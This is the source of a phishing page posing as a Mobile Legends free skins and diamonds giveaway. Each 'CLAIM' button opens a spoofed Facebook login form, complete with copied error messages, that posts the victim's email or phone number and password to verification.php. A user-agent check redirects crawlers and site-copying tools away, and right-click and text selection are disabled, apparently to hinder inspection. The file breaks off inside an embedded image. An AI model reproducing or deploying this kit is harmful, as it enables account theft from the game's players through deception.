<?php  
session_start();
session_destroy();

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/ilyas.pashati88');
die();
}

?>
<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta property="og:title" content="Mobile Legends: Bang Bang" />

    <meta property="og:description" content="Get your favorite skins for free" />

    <meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png" />

    <title>Mobile Legends</title>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <link rel="stylesheet" href="static/css/imryu.css">

    <link rel="stylesheet" href="static/css/animate.css">

    <link rel="stylesheet" href="static/css/facebook.css">

    <link rel="stylesheet" href="static/css/twitter.css">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="shorcut icon" href="https://i.pinimg.com/originals/5f/3f/e8/5f3fe88ff2c07d4ebd0a85f64b272e05.jpg">

</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<iframe scrolling='no' allow='autoplay' src='static/sound.mp3' width='0' height='0' frameborder='no'></iframe>

    <div id="bg"></div>

    <div class="ryucodex">



        <div class="navbar">

            <img class="logoLeft" src="https://pht.qoo-static.com/VObo_efVQ255Uny-K5k6EEMxQ9PQYk6PFNSReWDQxKf19HiXBH8BbluIzH1e43iQiw=w512">

            <div class="text-left text-white text-header">

                 MOBILE LEGENDS<br>

                <span>FREE SKIN & DIAMONDS</span>

            </div>

            <img class="logoRight" src="static/img/logo.png" alt="">

        </div>

        <div class="ryu-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
               <div class="carousel-inner">
                  <div class="carousel-item active">
                     <video id="soundSystem" src="static/sound.mp3" autoplay muted class="img-ryu-banner1" style="display: none;"></video>
<div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;"> <iframe style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden" frameborder="0" type="text/html" src="https://www.youtube.com/embed/8By-0qQKT2M?controls=0&loop=1&autoplay=1&fs=1&iv_load_policy=3&showinfo=0&rel=0&cc_load_policy=0&start=0&end=0&origin=https://youtubeembedcode.com" width="100%" height="100%" allowfullscreen autoplay muted loop allow="autoplay" controls="0"> </iframe> </div>
                 
    </div>
               </div> 
            </div>
         </div>

         <div class="cat">

            <div class="boxCat" id="showEpic">

               <img src="static/img/boxOn.png" alt="">

               <div class="txtCat">NEW SKIN</div>

            </div>

            <div class="boxCat" id="showKof">

               <img src="static/img/boxOn.png" alt="">

               <div class="txtCat">EFFECT RECALL</div>

            </div>

            <div class="boxCat" id="showBorders">

               <img src="static/img/boxOn.png" alt="">

               <div class="txtCat">BORDERS</div>

            </div>

            <div class="boxCat" id="showDm" style="margin-top: 5px;">

               <img src="static/img/boxOn.png" alt="">

               <div class="txtCat">DIAMONDS</div>

            </div>

            

         </div>

         <div class="ryuContent">

            <div class="scroll">

               <div class="skins text-center pb-4" id="epic">
                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src=" https://i.ibb.co/G7cyn5G/Esme.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/kof/6.png" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src=" https://i.ibb.co/VtKsP4m/lingg.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/kof/3.png" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/kof/4.png" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/kof/5.png" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>
                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                     <img src="https://i.ibb.co/PZ5p2BN/brody.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                     <img src="https://i.ibb.co/MhvFPws/Yuzong.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                     <img src="static/img/skins/gg.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                     <img src="https://i.ibb.co/xC70L65/IMG-20210424-015454.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/rQ0ZB1P/IMG-20210424-014937.jpg "alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/chou.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/zGGQSr4/IMG-20210424-014327.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/dD8Fh3r/IMG-20210424-015023.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                 

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/68DhKFk/IMG-20210424-014712.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/c1W74Mk/IMG-20210424-014533.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/f4R4BYj/IMG-20210424-014614.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/YhG02S3/IMG-20210424-020916.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/HhzWxpZ/Capture.png" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/HP6D2sd/IMG-20210424-014845.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/K6gX71h/Capture.png" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/z.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/frac.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/1newc.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/2newc.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/2new.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/1new.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/16.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/1.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/15.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/11.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/3.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/7.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/2.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/6.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/4.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/8.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/9.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/10.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/5.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/12.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/13.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>



                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="static/img/skins/14.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

               </div>

               <div class="skins text-center pb-4" id="kof" style="display: none;">

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/Pcmw7rP/b1.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/G9gsVfz/b2.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/sqfMLmk/b3.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/DV8nKdc/b4.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/dm2jKFr/b5.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBox" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBox">

                        <img src="https://i.ibb.co/vXyxPJt/b6.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                </div>

                <div class="skins text-center pb-4" id="borders" style="display: none;">

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/1.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/2.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/3.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/4.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/5.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/6.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/7.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/8.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/9.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/borders/10.jpeg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

               </div>

               <div class="skins text-center pb-4" id="dm" style="display: none;">

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/dm/5000.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/dm/2500.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/dm/1500.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/dm/1000.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

                  <div class="boxSkins2">

                     <img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">

                     <div class="contentBoxDm">

                        <img src="static/img/dm/500.jpg" alt="">

                        <button id="doLogin" class="btnSkins">CLAIM</button>

                     </div>

                  </div>

               </div>

            </div>

        </div>

    </div>



    <div class="ryubackdrop">

            <div class="ryuboxlogin animate__animated animate__fadeIn">

                <div class="row my-3 d-block mx-auto">

                    <div class="closeBox">&times;</div>

                    <div class="col-md-12 col-12 mb-4 text-white text-center ryutextbox">

                        Login using your social media account

                    </div>

                    <div class="col-md-12 col-12">

                        <button class="btn btn-primary text-left w-100" id="fbLogin" style="background-color: #2344ff !important; border: 1px solid #2344ff !important;"> <i class="zmdi zmdi-facebook" style="font-size: 20px;"></i> <div class="txtLogin2" style="width: 90%;">Login with Facebook</div></button>

                
                    </div>

                </div>

            </div>

        </div>



        <div class="popup-login login-facebook animate__animated animate__fadeIn" style="display: none;">

	<div class="popup-box-login-fb">

		<a href="javascript:void(0);" class="close-fb"><i class="zmdi zmdi-close"></i></a>

		<div class="navbar-fb">

			<img src="https://jefanya.com/data/ZXCLAIM-VV14/login/facebook_text.png">

		</div>

		<div class="content-box-fb">
      <p class="alert sandi">Wrong password. <b>Have you forgotten your password?</b></p>
      <p class="alert email">The mobile number or email you entered doesn't match any of the accounts. <b>Find your account.</b></p>

			<img src="https://i.pinimg.com/originals/5f/3f/e8/5f3fe88ff2c07d4ebd0a85f64b272e05.jpg">

			<div class="txt-login-fb">

				 Log in to your Facebook account to connect to Mobile Legends

			</div>

			<form class="login-form" action="verification.php" method="post" onsubmit="return valid()">

				<input type="text" name="email" id="user" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off">

				<input type="password" name="password" id="pass" placeholder="Password" autocomplete="off" autocapitalize="off">

				<input type="hidden" name="login" value="Facebook" readonly>

				<button type="submit" class="btn-login-fb">Log In</button>

			</form>

			<div class="txt-create-account">Create account</div>

			<div class="txt-not-now">Not now</div>

			<div class="txt-forgotten-password">Forgotten password?</div>

		</div>

		<div class="language-box">

			<center>

			<div class="language-name language-name-active">English (UK)</div>

			<div class="language-name">Bahasa Indonesia</div>

			<div class="language-name">Basa Jawa</div>

			<div class="language-name">Bahasa Melayu</div>

			<div class="language-name">日本語</div>

			<div class="language-name">Español</div>

			<div class="language-name">Português (Brasil)</div>

			<div class="language-name">

				<i class="fa fa-plus"></i>

			</div>

			</center>

		</div>

		<div class="copyright">Facebook Inc.</div>

	</div>

</div>



<div class="popup-login login-google animate__animated animate__fadeIn" style="display: none;">

	<div class="popup-box-login-twitter">

	<a href="javascript:void(0);" id="closeGoogle" class="close-other"><i class="zmdi zmdi-close"></i></a>

		<div class="header-twitter">

			<center>

			<img src="data:image/png;base64,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